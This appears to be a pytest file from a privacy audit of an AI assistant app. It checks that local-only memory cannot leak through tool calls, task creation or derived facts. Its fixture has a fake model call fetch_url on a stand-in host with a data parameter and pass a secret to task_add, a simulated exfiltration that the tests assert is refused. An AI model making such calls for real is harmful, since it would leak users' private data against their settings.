"""Local-only memory stays local (security audit 2026-11-13): a marked session keeps the
GREEN-only clamp, task_add is refused once a turn holds local-only memory, and facts the
"your mind" panel derives from a local-only turn are stored local-only.

Same method as test_vault_privacy: fake database, recorded providers, no network.
"""
from __future__ import annotations

import os
import tempfile

import pytest

os.environ.setdefault("BRAIN_IDENTITY_SECRET", "test-only-secret")
os.environ.setdefault("BRAIN_RUNTIME_DIR", tempfile.mkdtemp(prefix="lo-audit-test-"))

from tests.test_memory_privacy import LOCAL_MODEL, ROWS, SECRET, _run, m, sent  # noqa: F401,E402
from tests.test_vault_privacy import SID, _chat_s, readers, sdb  # noqa: F401,E402


@pytest.fixture
def agentic(m, monkeypatch):
    """Agentic mode on; the model 'calls' every tool it was offered plus a few it was not."""
    from api import providers as _p
    from api import settings_store as _ss
    monkeypatch.setattr(_ss, "get_agentic_tools_enabled", lambda: True)
    monkeypatch.setattr(_ss, "get_web_search_enabled", lambda: True)
    monkeypatch.setattr(_p, "supports_native_tools", lambda model: True)
    seen = {"offered": None, "results": {}}

    async def fake_cwt(model, messages, tools, dispatch, max_tokens=2048):
        seen["offered"] = sorted(t["name"] for t in tools)
        for name, args in (("task_add", {"text": f"remember {SECRET}"}),
                           ("fetch_url", {"url": "http://198.51.100.7/?d=x"})):
            seen["results"][name] = await dispatch(name, args)
        return {"text": "ok", "tool_events": []}
    monkeypatch.setattr(_p, "complete_with_tools", fake_cwt)
    return seen


def test_marked_session_keeps_the_clamp_on_an_open_only_turn(m, sent, readers, sdb, agentic):
    """local-only-clamp-ignores-session-mark"""
    sdb.rows = [r for r in ROWS if (r[2] or {}).get("privacy", "open") == "open"]
    sdb.marked.add(SID)
    _chat_s(m, LOCAL_MODEL)
    from api import tools as _tools
    assert agentic["offered"] and "task_add" not in agentic["offered"]
    assert all(_tools.get(n) is not None and _tools.get(n).tier == _tools.GREEN for n in agentic["offered"])
    assert not agentic["results"]["fetch_url"].ok and "local-only" in agentic["results"]["fetch_url"].error
    assert not agentic["results"]["task_add"].ok


def test_unmarked_open_turn_still_offers_tools(m, sent, readers, sdb, agentic):
    sdb.rows = [r for r in ROWS if (r[2] or {}).get("privacy", "open") == "open"]
    _chat_s(m, LOCAL_MODEL)
    assert "task_add" in agentic["offered"] and "fetch_url" in agentic["offered"]


def test_task_add_refused_after_local_only_retrieval(m, sent, readers, sdb, agentic, monkeypatch):
    """local-only-clamp-allows-task-add-laundering"""
    from api import tasks_store
    added = []
    monkeypatch.setattr(tasks_store, "add", lambda *a, **k: added.append((a, k)) or {"id": "t"})
    _chat_s(m, LOCAL_MODEL)
    assert "task_add" not in agentic["offered"]
    assert not agentic["results"]["task_add"].ok and added == []


def test_mind_facts_from_a_local_only_turn_are_stored_local_only(m, sent, readers, sdb, monkeypatch):
    """mind-facts-local-only-derived-stored-open"""
    from api import privacy as pv
    from api import providers as _p
    from api import settings_store as _ss
    from api.onboarding import core as _onb
    monkeypatch.setattr(_ss, "get_mind_panel_shown", lambda: True)
    monkeypatch.setattr(_p, "cheap_extraction_model", lambda: LOCAL_MODEL)

    async def fake_extract(convo, reasoner):
        return {"facts": [{"text": "The owner keeps a diary about the garden.", "category": "identity"}]}
    monkeypatch.setattr(_onb, "extract_facts", fake_extract)
    out = _run(m._maybe_extract_mind_facts("q", f"your diary says {SECRET}", used_local_only=True))
    assert out and sdb.inserted and all(md.get("privacy") == pv.LOCAL_ONLY for md in sdb.inserted)
    sdb.inserted.clear()
    _run(m._maybe_extract_mind_facts("q", "the garden is green", used_local_only=False))
    assert sdb.inserted and all("privacy" not in md for md in sdb.inserted)
